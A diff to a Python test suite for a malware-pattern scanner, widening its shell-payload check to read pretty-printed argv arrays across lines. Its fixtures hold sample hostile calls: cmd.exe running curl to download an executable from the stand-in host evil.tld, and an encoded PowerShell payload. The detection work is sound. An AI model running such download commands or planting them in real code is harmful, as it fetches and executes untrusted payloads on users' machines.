@@ -1625,25 +1625,21 @@ def test_a_bare_shell_name_inside_a_word_is_not_a_shell():
     assert SHELL_DESCRIPTION not in hits
 
 
-def test_the_shell_payload_check_does_not_cross_lines():
-    """A downloader on a *later* line is a different statement, not this call."""
-    hits = scan_text_for_malware_patterns(
-        "execSync('/bin/sh -c \"npm run build\"');\n"
-        "fetchWithCurl('http://registry.example.tld/manifest');\n"
-    )
+# ---------------------------------------------------------------------------
+# F43 — the payload arms read a formatted argv, and still stop at the statement
+#
+# The window was bounded to one LINE, which is the whole call in a minified
+# bundle and a quarter of it in source: prettier splits `spawn("cmd.exe",
+# ["/C", "curl … -o a.exe"])` over four lines, so the coverage F38 added landed
+# on published bundles and missed readable code. Widened to `SHELL_ARGV_LINES`
+# further lines, but only across material that cannot be a different statement
+# (no `;`, `{}`, `()`, `=`) — a plain `[\s\S]` window reads the NEXT statement's
+# `curl` as this call's payload. Re-measured over the same corpus: no new hits.
+# ---------------------------------------------------------------------------
 
-    assert SHELL_DESCRIPTION not in hits
 
-
-def test_a_payload_split_across_lines_is_the_known_gap():
-    """The price of the line bound, pinned rather than left implicit (F43).
-
-    The same call on one line IS reported; formatted over four, the payload sits
-    outside the window. That is right for a minified bundle — where a whole call
-    is one line — and wrong for pretty-printed source, so it is recorded as a
-    follow-up rather than widened here: `[\\s\\S]` would reach into the next
-    statement, which is the failure the F35 wiring window had to be capped for.
-    """
+def test_a_payload_in_a_formatted_argv_is_reported():
+    """The F43 gap, closed: the same call reads the same either way."""
     one_line = 'cp.spawn("cmd.exe", ["/C", "curl http://evil.tld/a.exe -o a.exe"]);'
     formatted = (
         'cp.spawn("cmd.exe", [\n'
@@ -1653,7 +1649,54 @@ def test_a_payload_split_across_lines_is_the_known_gap():
     )
 
     assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(one_line)
-    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(formatted)
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(formatted)
+
+
+def test_an_encoded_powershell_payload_survives_formatting_too():
+    """The PowerShell arm reads across the same lines, not just the POSIX one."""
+    formatted = (
+        "execFile('powershell.exe', [\n"
+        "    '-NoProfile',\n"
+        "    '-enc',\n"
+        "    'SQBFAFgAIAAoAE4AZQB3AC0A'\n"
+        "]);\n"
+    )
+
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(formatted)
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        # A terminated statement ends the call; whatever follows is not its argv.
+        "execSync('/bin/sh -c \"npm run build\"');\n"
+        "const res = await curl(url);\n",
+        # ASI style, no semicolon anywhere — the *call* on the next line is what
+        # stops it, which is why `()` is excluded and not just `;`.
+        "execSync('/bin/sh -c \"npm run build\"')\n"
+        "download(curl, url)\n",
+        # An assignment, likewise: `=` cannot appear inside a formatted argv.
+        "spawn('/bin/bash', ['-c', script])\n"
+        "const tool = 'curl'\n",
+        # A block boundary.
+        "function run() {\n"
+        "    spawnSync('cmd.exe', ['/c', 'chcp 65001'])\n"
+        "}\n"
+        "const fetcher = 'wget'\n",
+    ],
+)
+def test_the_shell_payload_check_does_not_cross_into_another_statement(code):
+    """The whole cost of a newline-tolerant window, pinned case by case."""
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(code), code
+
+
+def test_the_shell_payload_check_stops_after_the_argv_line_budget():
+    """`SHELL_ARGV_LINES` is a real bound, not a formality."""
+    near = 'spawn("cmd.exe", [\n' + '    "/C",\n' * 4 + '    "curl http://evil.tld/a"\n]);'
+    far = 'spawn("cmd.exe", [\n' + '    "/C",\n' * 40 + '    "curl http://evil.tld/a"\n]);'
+
+    assert SHELL_DESCRIPTION in scan_text_for_malware_patterns(near)
+    assert SHELL_DESCRIPTION not in scan_text_for_malware_patterns(far)
 
 
 def test_windows_support_code_no_longer_escalates_its_own_capabilities():
